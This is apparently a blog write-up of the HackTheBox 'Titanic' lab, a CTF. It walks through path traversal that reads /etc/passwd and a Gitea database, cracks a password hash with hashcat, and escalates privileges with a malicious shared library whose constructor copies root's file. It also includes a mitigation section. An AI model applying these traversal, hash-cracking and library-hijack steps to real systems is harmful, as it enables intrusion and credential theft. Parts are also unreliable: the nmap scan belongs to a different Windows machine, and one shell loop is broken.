---
title: Titanic HackTheBox
date: 2025-02-13 20:00:00 +0700
layout: post
categories:
  - Hack The Box
tags:
  - writeups
  - ctf
  - easy
  - hackthebox
  - linux
image: 
    path: /assets/img/sample/titanic/Titanic.jpg
    alt: Titanic Machine HackTheBox
---


## Enumeration



Titanic is a machine that aggregates skills about enmeration, exploitfile traversal vulnerability, crack password,...

~~~ shell
┌──(trit㉿chimp)-[~/HackTheBox/Administrator]
└─$ echo "10.10.11.55 titanic.htb" | sudo tee -a /etc/hosts
~~~

### Scan With Nmap

~~~ shell
┌──(trit㉿chimp)-[~/HackTheBox/Vintage]
└─$ nmap -A -sC -sV -p- 10.10.11.45
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-13 08:28 EST
Nmap scan report for 10.10.11.45
Host is up (0.067s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-02-13 13:29:07Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: vintage.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vintage.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49685/tcp open  msrpc         Microsoft Windows RPC
58375/tcp open  msrpc         Microsoft Windows RPC
60857/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-02-13T13:30:06
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: -16m55s

TRACEROUTE (using port 139/tcp)
HOP RTT      ADDRESS
1   80.21 ms 10.10.14.1
2   87.44 ms 10.10.11.45

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1126.28 seconds
~~~

### Directory Enumeration With Dirsearch

First I enumeration directory the domain **titanic.htb** but nothing.

~~~ shell
┌──(trit㉿chimp)-[~/HackTheBox/Titanic]
└─$ dirsearch -u "http://titanic.htb/" -t 50 -i 200
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                       
 (_||| _) (/_(_|| (_| )                                                                                                                
                                                                                                                                       
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50 | Wordlist size: 11460

Output File: /home/trit/HackTheBox/Titanic/reports/http_titanic.htb/__25-02-16_01-24-19.txt

Target: http://titanic.htb/

[01:24:19] Starting:                                                                                                                   
                                                                             
Task Completed  
~~~

### Subdomain Enumeration With ffuf

I found subdomain **dev.titanic.htb**, so I add  into `/etc/hosts` file.

~~~ shell 
┌──(trit㉿chimp)-[~/HackTheBox/Titanic]
└─$ ffuf -u http://titanic.htb/ -w /usr/share/wordlists/dirb/common.txt -H "HOST:FUZZ.titanic.htb" -fc 301 -t 100

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://titanic.htb/
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Header           : Host: FUZZ.titanic.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 301
________________________________________________

dev                     [Status: 200, Size: 13982, Words: 1107, Lines: 276, Duration: 83ms]
:: Progress: [4614/4614] :: Job [1/1] :: 2145 req/sec :: Duration: [0:00:03] :: Errors: 0 ::
~~~

I enumeration directory the domain **dev.titanic.htb**.


~~~ shell
┌──(trit㉿chimp)-[~/HackTheBox/Titanic]
└─$ dirsearch -u "http://dev.titanic.htb/" -t 50 -i 200

/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                       
 (_||| _) (/_(_|| (_| )                                                                                                                
                                                                                                                                       
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50 | Wordlist size: 11460

Output File: /home/trit/HackTheBox/Titanic/reports/http_dev.titanic.htb/__25-02-16_01-28-51.txt

Target: http://dev.titanic.htb/

[01:28:51] Starting:                                                                                                                   
[01:28:58] 200 -    1KB - /.well-known/openid-configuration                 
[01:28:58] 200 -  206B  - /.well-known/security.txt                         
[01:29:15] 200 -   20KB - /administrator                                    
[01:29:15] 200 -   20KB - /administrator/                                   
[01:29:17] 200 -  433B  - /api/swagger                                      
[01:29:30] 200 -   25KB - /developer                                        
[01:29:34] 200 -   20KB - /explore/repos                                    
[01:30:08] 200 -  170B  - /sitemap.xml                                      
[01:30:19] 200 -   11KB - /user/login/                                      

~~~

I found a lot of interesting things here.


~~~
http://dev.titanic.htb/.well-known/openid-configuration**


{
    "issuer": "http://gitea.titanic.htb/",
    "authorization_endpoint": "http://gitea.titanic.htb/login/oauth/authorize",
    "token_endpoint": "http://gitea.titanic.htb/login/oauth/access_token",
    "jwks_uri": "http://gitea.titanic.htb/login/oauth/keys",
    "userinfo_endpoint": "http://gitea.titanic.htb/login/oauth/userinfo",
    "introspection_endpoint": "http://gitea.titanic.htb/login/oauth/introspect",
    "response_types_supported": [
        "code",
        "id_token"
    ],
    "id_token_signing_alg_values_supported": [
        "RS256"
    ],
    "subject_types_supported": [
        "public"
    ],
    "scopes_supported": [
        "openid",
        "profile",
        "email",
        "groups"
    ],
    "claims_supported": [
        "aud",
        "exp",
        "iat",
        "iss",
        "sub",
        "name",
        "preferred_username",
        "profile",
        "picture",
        "website",
        "locale",
        "updated_at",
        "email",
        "email_verified",
        "groups"
    ],
    "code_challenge_methods_supported": [
        "plain",
        "S256"
    ],
    "grant_types_supported": [
        "authorization_code",
        "refresh_token"
    ]
}
~~~

I found subdomain **gitea.titanic.htb**, so I add  into `/etc/hosts` file.

~~~
http://dev.titanic.htb/developer/docker-config/src/branch/main/mysql/docker-compose.yml


version: '3.8'

services:
  mysql:
    image: mysql:8.0
    container_name: mysql
    ports:
      - "127.0.0.1:3306:3306"
    environment:
      MYSQL_ROOT_PASSWORD: 'MySQLP@$$w0rd!'
      MYSQL_DATABASE: tickets 
      MYSQL_USER: sql_svc
      MYSQL_PASSWORD: sql_password
    restart: always
    
    
http://dev.titanic.htb/developer/docker-config/src/branch/main/gitea/docker-compose.yml

version: '3'

services:
  gitea:
    image: gitea/gitea
    container_name: gitea
    ports:
      - "127.0.0.1:3000:3000"
      - "127.0.0.1:2222:22"  # Optional for SSH access
    volumes:
      - /home/developer/gitea/data:/data # Replace with your path
    environment:
      - USER_UID=1000
      - USER_GID=1000
    restart: always
~~~

![](/assets/img/sample/titanic/1.png)

## File Traversal Vulnerability

I used `Burp Suite` tool to capture packet, in `Chrome` I install `FoxyProxy` extension.

![](/assets/img/sample/titanic/2.png)

![](/assets/img/sample/titanic/3.png)

Send request above to repeater, then edit request, finally send it and we have user flag.

![](/assets/img/sample/titanic/4.png)


~~~ shell 
┌──(trit㉿chimp)-[~/HackTheBox/Titanic]
└─$ curl http://titanic.htb/download?ticket=../../../../../../../../../../home/developer/user.txt
253845cca0ee71aa4df5e31279b*****
~~~

~~~ shell 
┌──(trit㉿chimp)-[~/HackTheBox/Titanic]
└─$ curl http://titanic.htb/download?ticket=../../../../../../../../../../etc/passwd          
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
developer:x:1000:1000:developer:/home/developer:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
dnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false
~~~

I found user `developer`. The next thing I need to do is find the password for the `developer` user. So, I get the file database though file traversal vulnerability. 


~~~ shell
┌──(trit㉿chimp)-[~/HackTheBox/Titanic]
└─$ curl "http://titanic.htb/download?ticket=../../../../../../../../../../home/developer/gitea/data/gitea/gitea.db" --output gitea.db
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 2036k  100 2036k    0     0  1952k      0  0:00:01  0:00:01 --:--:-- 1953k
                                                                                                                                                 
┌──(trit㉿chimp)-[~/HackTheBox/Titanic]
└─$ ls
5d5352d4-9b15-468b-a084-fe28d553acee.json  docker-config  flask-app  gitea.db  reports
                                                                                                                                                 
┌──(trit㉿chimp)-[~/HackTheBox/Titanic]
└─$ file gitea.db        
gitea.db: SQLite 3.x database, last written using SQLite version 3045001, file counter 562, database pages 509, cookie 0x1d9, schema 4, UTF-8, version-valid-for 562
    
┌──(trit㉿chimp)-[~/HackTheBox/Titanic]
└─$ sqlite3 gitea.db

SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> select * from user;
1|administrator|administrator||root@titanic.htb|0|enabled|cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136|pbkdf2$50000$50|0|0|0||0|||70a5bd0c1a5d23caa49030172cdcabdc|2d149e5fbd1b20cf31db3e3c6a28fc9b|en-US||1722595379|1722597477|1722597477|0|-1|1|1|0|0|0|1|0|2e1e70639ac6b0eecbdab4a3d19e0f44|root@titanic.htb|0|0|0|0|0|0|0|0|0||gitea-auto|0
2|developer|developer||developer@titanic.htb|0|enabled|e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56|pbkdf2$50000$50|0|0|0||0|||0ce6f07fc9b557bc070fa7bef76a0d15|8bf3e3452b78544f8bee9400d6936d34|en-US||1722595646|1722603397|1722603397|0|-1|1|0|0|0|0|1|0|e2d95b7e207e432f62f3508be406c11b|developer@titanic.htb|0|0|0|0|2|0|0|0|0||gitea-auto|0
Program interrupted.

~~~

I tried Crack Password but it was a scam so I found another way to crack the hash.

~~~ shell
┌──(trit㉿chimp)-[~/HackTheBox/Titanic]
└─$ sqlite3 gitea.db "select passwd,salt,name from user" | while read data; do digest=$(echo "$data" | cut -d'|' -f1 | xxd -r -p | base64); salt=echo "${name}:sha256:50000:${salt}:${digest}"; done | tee gitea.hashes

administrator:sha256:50000:LRSeX70bIM8x2z48aij8mw==:y6IMz5J9OtBWe2gWFzLT+8oJjOiGu8kjtAYqOWDUWcCNLfwGOyQGrJIHyYDEfF0BcTY=
developer:sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=
~~~

Add hash into `hash.txt` file.

~~~ 
sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2
~~~

## Crack Password

I used tool `nmap` to Crack Password.

~~~ shell
┌──(trit㉿chimp)-[~/HackTheBox/Titanic]
└─$ hashcat -m 10900 hash.txt /usr/share/wordlists/rockyou.txt --force
hashcat (v6.2.6) starting


sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=:25282528
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 10900 (PBKDF2-HMAC-SHA256)
Hash.Target......: sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqc...lM+1Y=
Time.Started.....: Mon Feb 17 05:52:44 2025, (10 secs)
Time.Estimated...: Mon Feb 17 05:52:54 2025, (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      592 H/s (7.36ms) @ Accel:128 Loops:128 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 6144/14344385 (0.04%)
Rejected.........: 0/6144 (0.00%)
Restore.Point....: 4096/14344385 (0.03%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:49920-49999
Candidate.Engine.: Device Generator
Candidates.#1....: newzealand -> iheartyou
Hardware.Mon.#1..: Util: 80%

Started: Mon Feb 17 05:51:42 2025
Stopped: Mon Feb 17 05:52:56 2025
~~~

Nice, I found `ssh` credential **developer/25282528 **.

~~~ shell
┌──(trit㉿chimp)-[~/HackTheBox/Titanic]
└─$ ssh developer@10.10.11.55
~~~

~~~
developer@titanic:~$ ls
gitea  mysql  user.txt
developer@titanic:~$ cat user.txt
253845cca0ee71aa4df5e31279bc44bb
~~~

## Privileges Escalation

#### Exploit Overview
Malicious Library Creation: The C code provided creates a shared library (libxcb.so.1) that includes a constructor function (__attribute__((constructor))). The function init() will be executed automatically when the shared library is loaded by an application. In this case, the function is set to run the command cat /root/root.txt > /tmp/root.txt, which copies the contents of /root/root.txt (a file containing root privileges or sensitive data) to /tmp/root.txt, making it accessible to any user.

#### Compiler Command:

~~~ shell
gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("cat /root/root.txt > /tmp/root.txt");
    exit(0);
}
EOF
~~~

This creates a shared object (libxcb.so.1) that will be loaded by an application.
The constructor function is automatically called when the shared library is loaded into memory, running the system command to copy sensitive data.
Copying the Malicious Library: After compiling the shared library, the file entertainment.jpg is renamed to root.jpg. This might be done to disguise the malicious library as an image file, making it less obvious to someone inspecting the system. The new root.jpg file could potentially be loaded by the vulnerable application, assuming it follows unsafe library loading practices.

The Vulnerability: This type of exploit works because the application might load shared libraries from directories that are writable by untrusted users (in this case, /opt/app/static/assets/images), or the LD_LIBRARY_PATH environment variable may be misconfigured to include unsafe paths. If an attacker can place their malicious library (like libxcb.so.1) into a directory the application looks at, the application will inadvertently load and execute it, running the code in the constructor.

#### How This Exploit Works
The malicious shared library is created with a constructor function that runs when the library is loaded. This constructor executes a command that copies the contents of a sensitive file (/root/root.txt) to a location (/tmp/root.txt) where other users can access it.
If the vulnerable application loads the library from a writable directory (e.g., /opt/app/static/assets/images), it will execute the malicious code, leading to a potential leak of sensitive data.
Renaming the file entertainment.jpg to root.jpg is a tactic to hide the malicious library in plain sight, making it harder to detect.
#### How to Exploit This
The attacker places the malicious shared library in a directory that the vulnerable application uses or is able to access.
When the vulnerable application loads libraries, it loads the malicious one (libxcb.so.1) as if it were a valid library, triggering the constructor function.
The constructor function runs the malicious command, copying sensitive data (/root/root.txt) into a publicly accessible file (/tmp/root.txt), which can then be accessed by the attacker.


#### How to Mitigate This Vulnerability

Disable constructor functions: Ensure that constructor functions in libraries cannot execute arbitrary code. Some systems or application configurations may allow the disabling of such functions.
Restrict directory write access: Ensure that only trusted users have write access to directories from which libraries can be loaded.
Use secure library paths: Ensure the system doesn't load libraries from untrusted or user-writable directories. You can set LD_LIBRARY_PATH to only include trusted paths.
Regular audits: Regularly audit directories where libraries are loaded from, as well as the permissions of those directories, to prevent malicious libraries from being placed there.

~~~ shell
developer@titanic:~$ cd /opt/app/static/assets/images/
developer@titanic:/opt/app/static/assets/images$ ls
entertainment.jpg  exquisite-dining.jpg  favicon.ico  home2.jpg  home.jpg  luxury-cabins.jpg  metadata.log  root.jpg
developer@titanic:/opt/app/static/assets/images$ gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("cat /root/root.txt > /tmp/root.txt");
    exit(0);
}
EOF
developer@titanic:/opt/app/static/assets/images$ ls
entertainment.jpg  exquisite-dining.jpg  favicon.ico  home2.jpg  home.jpg  libxcb.so.1  luxury-cabins.jpg  metadata.log  root.jpg
developer@titanic:/opt/app/static/assets/images$ cp entertainment.jpg root.jpg
developer@titanic:/opt/app/static/assets/images$ cat /tmp/root.txt
c8f13771f853b07314794feaa02*****
~~~

***Thanks for reading the article.***